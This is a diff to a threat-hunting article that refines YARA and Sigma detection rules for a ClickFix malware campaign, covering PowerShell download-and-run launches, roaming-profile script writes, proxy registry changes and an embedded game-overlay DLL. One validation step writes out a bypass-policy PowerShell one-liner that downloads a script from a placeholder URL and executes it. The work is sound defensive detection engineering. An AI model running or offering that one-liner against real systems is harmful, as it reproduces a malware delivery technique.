@@ -82,7 +82,7 @@ rule Newdouble_ClickFix_SteamCDP_Loader_Strings {
 **ATT&CK Coverage:** None
 **ATT&CK Note:** The DLL is an in-game overlay and hook set for Counter-Strike 2. I am not mapping a technique to it because its hook bodies were not read and its purposes rest on the hook names.
 **Confidence:** HIGH
-**False Positives:** None known. The build path and the four hook names are specific to this builder, and the rule needs the path or three of the six strings. A legitimate game overlay would not carry the `berserk_gamebaker` build path.
+**False Positives:** None known for the build-path branch: a legitimate game overlay would not carry the `berserk_gamebaker` build path. The second branch needs no path, only three of the five hook-name and localisation strings. The hook names are ordinary identifiers, and the benign corpus checked held no Steam install (see the tier reason), so this branch has an uncharacterized false-positive profile.
 **Blind Spots:** Misses a rebuild with a stripped debug directory and renamed hooks. Matches the outer executable as well as the carved DLL, because the DLL is stored unencoded inside it; a DLL that is stored encoded is not seen until it is decoded in memory.
 **Validation:** Scan the carved DLL (SHA-256 `f6afe770...`) or the outer executable and confirm a hit. Scan a game overlay or a Dear ImGui sample application and confirm no hit.
 **Deployment:** File scan and memory scan (the DLL is a memory-scan seed); review hits, do not alert or block on them.
@@ -90,7 +90,7 @@ rule Newdouble_ClickFix_SteamCDP_Loader_Strings {
 ```yara
 rule Newdouble_ClickFix_Berserk_Embedded_DLL_PDB_Hooks {
    meta:
-      description = "Detects the Counter-Strike 2 overlay DLL carried inside the newdouble ClickFix executable, by its build PDB path together with its four hook-name strings and the matchmaking-penalty localisation token"
+      description = "Detects the Counter-Strike 2 overlay DLL carried inside the newdouble ClickFix executable, by either its build PDB path alone or any three of its four hook-name strings and the matchmaking-penalty localisation token"
       license = "CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/"
       author = "The Hunters Ledger"
       reference = "https://the-hunters-ledger.com/hunting-detections/newdouble-clickfix-detections/"
@@ -158,7 +158,7 @@ All six rules are Hunting and use `status: experimental`. Each carries an `stp.N
 
 ### Hunting Rules
 
-#### ClickFix PowerShell Stager Pasted Into Run Dialog Downloading a Script Then Running It
+#### PowerShell Launched From Explorer With Download-and-Run Script Arguments (ClickFix Run Dialog Shape)
 
 **Tier:** Hunting
 **Robustness:** 2
@@ -167,20 +167,25 @@ All six rules are Hunting and use `status: experimental`. Each carries an `stp.N
 **ATT&CK Note:** An existing upstream rule covers the Run dialog history on registry telemetry; this rule covers the same paste on process-creation telemetry and keys on the download-save-run shape of the command, not on the operator's URL.
 **Confidence:** MODERATE
 **False Positives:** An administrator pasting a download-and-run one-liner into the Run dialog; internal onboarding instructions that tell users to paste a script bootstrap command.
-**Blind Spots:** Misses a variant that splits the download and the run into separate commands, one that uses `curl.exe` or `Start-BitsTransfer` in place of `iwr`, and any delivery that does not go through the Run dialog (a terminal window opened by the victim has a different parent process).
+**Blind Spots:** The five substrings are not ordered or bound together: a command line holding them in any order matches, including one that runs a different script from the one it saved. Misses a variant that splits the download and the run into separate commands, one that uses `curl.exe` or `Start-BitsTransfer` in place of `iwr`, and any delivery that does not go through the Run dialog (a terminal window opened by the victim has a different parent process).
 **Validation:** Paste the observed one-liner shape (`powershell -ep bypass -c "IWR <url> -OutFile $env:TEMP\x.ps1 -UseBasicParsing; powershell -ep bypass -File $env:TEMP\x.ps1"`) into the Run dialog on a test host and confirm the rule fires on the outer process. Running the same text from an interactive PowerShell prompt must not fire it, because the parent is not `explorer.exe`.
 **Deployment:** Threat hunting over process-creation telemetry with the command line; not for alerting.
 
 ```yaml
-title: ClickFix PowerShell Stager Pasted Into Run Dialog Downloading a Script Then Running It
+title: PowerShell Launched From Explorer With Download-and-Run Script Arguments (ClickFix Run Dialog Shape)
 id: a952ed07-5481-4776-aa2e-22187bb98c4a
 status: experimental
 description: >-
-    Detects a PowerShell command line launched by explorer.exe that downloads a
-    script with Invoke-WebRequest, saves it with -OutFile as a .ps1 file, and
-    runs it with -File in the same command. This is the shape of the command
-    a ClickFix fake-verification page places on the clipboard for the victim to
-    paste into the Windows Run dialog.
+    Detects a PowerShell command line launched by explorer.exe that contains
+    iwr or Invoke-WebRequest together with the substrings -OutFile, .ps1 and
+    -File, in any order. The substrings are tested independently, so the rule
+    does not tie the saved path to the path that is run and does not require
+    the download to come first. The observed command shape, which a ClickFix
+    fake-verification page places on the clipboard for the victim to paste
+    into the Windows Run dialog, downloads a script with Invoke-WebRequest,
+    saves it with -OutFile as a .ps1 file and runs it with -File in the same
+    command. Explorer is also the parent for shortcuts and double-clicks, so
+    the Run dialog is the likeliest source and not the only one.
 references:
     - https://the-hunters-ledger.com/hunting-detections/newdouble-clickfix-detections/
 author: The Hunters Ledger
@@ -281,8 +286,8 @@ level: medium
 **ATT&CK Coverage:** T1059.001 (PowerShell)
 **Confidence:** LOW
 **False Positives:** PowerShell modules or profile scripts saved to the roaming profile by administrators; developer tooling that writes helper scripts under the roaming profile.
-**Blind Spots:** Misses a script copied by a different process, and any write outside the roaming profile.
-**Validation:** Run `Copy-Item` from a PowerShell prompt into `%APPDATA%\SomeFolder\test.ps1` and confirm the rule fires.
+**Blind Spots:** Misses a script copied by a different process, and any write outside the roaming profile. The subfolder test is a case-sensitive regex on `\AppData\Roaming\`, so a path written in another letter case is missed on regex-based backends. A script written directly into the roaming folder with no subfolder does not match.
+**Validation:** Run `Copy-Item` from a PowerShell prompt into `%APPDATA%\SomeFolder\test.ps1` and confirm the rule fires. The same copy to `%APPDATA%\test.ps1` (no subfolder) must NOT fire.
 **Deployment:** Threat hunting over file-creation telemetry; not for alerting.
 
 The first-stage script copies itself to `%APPDATA%\MyApp\y.ps1` and relaunches from that copy. A rule keyed on that exact path fails as soon as the operator changes the folder name, so the exact path is in the IOC feed and this rule keys on the write pattern instead.
@@ -317,6 +322,7 @@ detection:
             - '\pwsh.exe'
         TargetFilename|contains: '\AppData\Roaming\'
         TargetFilename|endswith: '.ps1'
+        TargetFilename|re: '.*\\AppData\\Roaming\\[^\\]+\\.*\.ps1'
     condition: selection
 falsepositives:
     - PowerShell modules or profile scripts saved to the roaming profile by administrators
@@ -332,7 +338,7 @@ level: low
 **ATT&CK Note:** The executable's proxy or PAC change is a candidate capability from static analysis. The values it writes were not recovered, so the rule keys on the writer and the setting, not the data.
 **Confidence:** LOW
 **False Positives:** VPN, proxy and filtering clients installed under the user profile that manage the system proxy; developer proxy tools started from a user profile folder.
-**Blind Spots:** Needs Sysmon registry monitoring on the Internet Settings key. Misses a writer that runs from outside AppData and a change made through a system API that does not pass through a monitored registry event.
+**Blind Spots:** The per-user scope comes from the `HKU\` prefix, which is how Sysmon renders a per-user key (as `HKU\<SID>\...`, never as `HKCU`); a machine-wide `HKLM\...\Internet Settings` write does not match. Needs Sysmon registry monitoring on the Internet Settings key. Misses a writer that runs from outside AppData and a change made through a system API that does not pass through a monitored registry event.
 **Validation:** Copy a test executable into `%APPDATA%` and have it set `ProxyEnable` under the per-user Internet Settings key; confirm the rule fires. The same change made by `rundll32.exe` from System32 must not fire it.
 **Deployment:** Threat hunting over registry-set telemetry; not for alerting.
 
@@ -362,6 +368,7 @@ logsource:
     definition: 'Requires Sysmon EID 13 (RegistryEvent value set) with the Internet Settings key path included in the registry monitoring config.'
 detection:
     selection:
+        TargetObject|startswith: 'HKU\'
         TargetObject|contains: '\Software\Microsoft\Windows\CurrentVersion\Internet Settings\'
         TargetObject|endswith:
             - '\ProxyServer'
